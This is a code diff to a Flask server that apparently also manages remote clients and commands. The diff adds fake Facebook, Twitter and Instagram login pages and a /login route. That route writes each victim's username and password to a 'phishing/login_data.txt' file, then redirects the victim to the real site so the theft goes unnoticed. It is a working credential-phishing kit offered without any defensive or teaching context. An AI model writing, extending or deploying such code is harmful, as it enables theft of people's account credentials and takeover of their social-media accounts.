@@ -9,7 +9,7 @@ from logging.handlers import RotatingFileHandler
 from queue import Queue, Empty
 
 import click
-from flask import Flask, request, send_file, Response, jsonify
+from flask import Flask, request, send_file, Response, jsonify, render_template, redirect, url_for
 from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
 from flask_restx import Api, Resource, fields
@@ -20,7 +20,7 @@ from config.config import Config
 from config.extensions import db
 from models import Client, Command, CommandType
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='ressources/templates', static_folder='ressources/static')
 app.config.from_object(Config)
 app.config['DEBUG'] = True
 db.init_app(app)
@@ -688,6 +688,49 @@ def stream_frames():
                    b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
         except Empty:
             continue
+
+
+@app.route('/')
+def home():
+    return redirect(url_for('fake_facebook'))
+
+@app.route('/facebook')
+def fake_facebook():
+    return render_template('facebook.html')
+
+@app.route('/twitter')
+def fake_twitter():
+    return render_template('twitter.html')
+
+@app.route('/instagram')
+def fake_instagram():
+    return render_template('instagram.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    # Vérifiez que tous les champs nécessaires sont présents
+    if 'username' in request.form and 'password' in request.form and 'origin' in request.form:
+        username = request.form['username']
+        password = request.form['password']
+        origin = request.form['origin']
+
+        # Create folder and file if it doesn't exist
+        if not os.path.exists('phishing'):
+            os.makedirs('phishing')
+
+        with open('phishing/login_data.txt', 'a') as file:
+            file.write(f'Username: {username}, Password: {password}, Origin: {origin}\n')
+        # Redirection vers la vraie page de connexion
+        if origin == 'facebook':
+            return redirect('https://www.facebook.com/login')
+        elif origin == 'twitter':
+            return redirect('https://twitter.com/login')
+        elif origin == 'instagram':
+            return redirect('https://www.instagram.com/accounts/login/')
+        else:
+            return redirect(url_for('home'))  # Fallback si l'origine n'est pas connue
+    else:
+        return "Missing data", 400
 
 
 setup_logging()
